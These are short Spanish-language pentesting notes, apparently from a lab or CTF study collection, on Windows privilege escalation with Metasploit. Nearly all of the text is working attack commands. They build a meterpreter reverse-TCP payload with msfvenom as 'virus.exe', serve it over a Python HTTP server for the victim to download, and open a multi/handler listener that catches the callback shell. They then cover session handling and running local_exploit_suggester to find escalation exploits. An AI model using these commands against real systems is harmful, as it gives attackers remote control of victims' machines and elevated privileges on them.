
- Tags: #escalada #escalada_privilegios_windows #metasploit  #msfvenom 

Generamos un payload con msfvenom y lo enviamos a la maquina objetivo

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -f exe -o virus.exe

#Creamos servidor en python para descargar desde la maquina victima el .exe

python3 -m http.server 5000

#nos poonemos a la escucha con meterpreter

msfconsole
>use multi/handler
>show optinos
>set LHOST ip 
>set LPORT 4444
>set PAYLOAD windows/meterpreter/reverse_tcp
>run
```

Ejecutamos el virus.exe desde la maquina victima
```bash
#Estando conectados a nuestra maquina con una session de meterpretesr .
#1 Si queremos una shell escribimos shell
#2 Salir de la shell y volver a meterpreter exit
#3 Poner la session en segundo plano background
#4 Ver sessiones disponibles session -l
#5 Acceder a la session session -i Id

#Utilizar un modulo de explotacion 
meterpreter>use local_exploit_suggester #Automatiza la enumeracion de ciertas formas de escalar privilegiosn en una session que tengamos en 2 plano

meterpreter>show options 
meterpreter>set SESSION Id 
meterpreter>run

#Nos hara una busqueda de posibles exploit que podremos utilizar para escalar privilegios entre otro , el metodo seria similar use un modlo configurarlo y ejecutarlo 

```